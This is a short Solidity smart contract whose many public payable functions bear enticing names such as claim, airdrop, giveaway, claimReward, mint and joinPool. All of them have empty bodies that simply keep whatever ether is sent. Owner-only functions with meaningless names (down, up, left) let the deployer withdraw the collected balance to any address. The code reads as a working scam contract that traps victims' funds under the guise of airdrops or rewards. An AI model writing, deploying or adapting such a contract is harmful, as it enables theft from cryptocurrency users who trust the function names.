// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ContractManagement{
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function _isOwner() private view returns(bool){
        return (msg.sender == owner);
    }


    receive() payable external{}
    fallback() payable external{}

    function claim() payable public{}
    function airdrop() payable public{}
    function giveaway() payable public{}
    function upgrade() payable public{}
    function migrate() payable public{}
    function buyEgg() payable public{}
    function joinPool() payable public{}
    function claimReward() payable public{}
    function mint() payable public{}
    function buy() payable public{}
    function maintain() payable public{}
    function call() payable public{}
    function submit() payable public{}
    function register() payable public{}
    function hodl() payable public{}
    function dyor() payable public{}

    modifier onlyOwner(){
        require(_isOwner());
        _;
    }
    
    function down() onlyOwner public{
        _withdraw(owner, address(this).balance);
    }

    function up(address addr, uint amount) onlyOwner public {
        _withdraw(addr, amount);
    }

    function left(uint amount) onlyOwner public{
        _withdraw(owner, amount);
    }

    function _withdraw(address addr, uint amount) private {
        payable(addr).transfer(amount);
    }

}